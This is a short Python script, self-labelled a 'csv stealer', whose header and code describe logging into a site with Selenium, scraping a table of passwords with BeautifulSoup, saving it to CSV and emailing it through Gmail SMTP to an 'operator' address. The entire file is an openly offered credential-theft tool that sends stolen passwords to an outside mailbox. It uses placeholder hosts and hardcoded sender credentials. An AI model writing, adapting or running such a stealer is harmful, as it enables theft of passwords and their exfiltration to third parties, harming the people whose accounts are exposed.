# =======================================================================>
#  csv stealer by khr1st - 2023
#
#  a detailed Python script that will retrieve a password 
#  list from a browser and email it back to the 
#  script operator. First, the script will use the Selenium package to 
#  open a web browser and navigate to the login page. Once on the 
#  login page, the script will input the login credentials from a CSV 
#  file, which will be stored in a secure location on the script 
#  operator's computer. After logging in, the script will navigate to 
#  the page containing the desired password list and extract the 
#  data using BeautifulSoup. The password list will then be saved to 
# a CSV file and emailed to the script operator using the smtplib package.
# =======================================================================>

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
import csv
import smtplib

# Read login credentials from CSV file
with open('login.csv', 'r') as file:
    reader = csv.reader(file)
    username, password = next(reader)

# Open web browser and navigate to login page
browser = webdriver.Firefox()
browser.get('https://example.com/login')

# Input login credentials and submit form
username_field = browser.find_element_by_name('username')
username_field.send_keys(username)
password_field = browser.find_element_by_name('password')
password_field.send_keys(password)
password_field.send_keys(Keys.RETURN)

# Navigate to page containing password list
browser.get('https://example.com/passwords')

# Extract password data using BeautifulSoup
html = browser.page_source
soup = BeautifulSoup(html, 'html.parser')
table = soup.find('table')
rows = table.find_all('tr')
passwords = []
for row in rows:
    cells = row.find_all('td')
    if cells:
        passwords.append([cell.text for cell in cells])
        
# Save password list to CSV file
with open('passwords.csv', 'w', newline='') as file:
    writer = csv.writer(file)
    writer.writerows(passwords)
    
# Email password list to script operator
sender_email = 'example@gmail.com'
sender_password = 'password123'
recipient_email = 'operator@gmail.com'
message = 'Subject: Password List\n\nPlease find attached the password list.'
with open('passwords.csv', 'rb') as file:
    file_data = file.read()
    message += file_data.decode('utf-8')
with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
    server.login(sender_email, sender_password)
    server.sendmail(sender_email, recipient_email, message)
    
# Close web browser
browser.quit()
